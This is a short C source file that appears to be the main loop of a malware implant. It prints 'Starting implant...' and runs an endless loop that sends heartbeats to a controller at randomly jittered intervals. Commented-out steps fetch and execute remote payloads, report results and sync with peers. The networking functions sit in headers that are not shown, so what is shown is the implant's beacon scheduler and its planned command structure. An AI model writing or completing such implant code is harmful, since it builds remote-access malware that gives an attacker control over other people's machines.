#include "http-client.h"
#include "config.h"
#include "heartbeat.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>



#define NOW (time(NULL))
#define RAND_RANGE(min, max) ((min) + rand() % ((max) - (min) + 1))

time_t next_hb, next_payload, next_report, next_sync;
time_t schedule(int base, int jitter) {
  return NOW + base + RAND_RANGE(-jitter, jitter);
}

int main(void) {

  printf("Starting implant...\n");

  srand(time(NULL));

  next_hb       = schedule(HEARTBEAT_INTERVAL, 5);
  next_payload  = schedule(PAYLOAD_INTERVAL, 15);
  next_report   = schedule(REPORT_INTERVAL, 15);
  next_sync     = schedule(SYNC_INTERVAL, 15);

  while(1) {
    time_t now = NOW;

    if (now >= next_hb) {
      send_heartbeat();
      next_hb = schedule(HEARTBEAT_INTERVAL, 5);
    }
    // if (now >= next_payload) {
    //   fetch_and_execute_payload();
    //   next_payload = schedule(PAYLOAD_INTERVAL, 5);
    // }
    // if (now >= next_report) {
    //   report_results();
    //   next_report = schedule(REPORT_INTERVAL, 10);
    // }
    // if (now >= next_sync) {
    //   gossip_sync();
    //   next_sync = schedule(SYNC_INTERVAL, 15);
    // }


    usleep(250*1000);
  }

  return 0;
}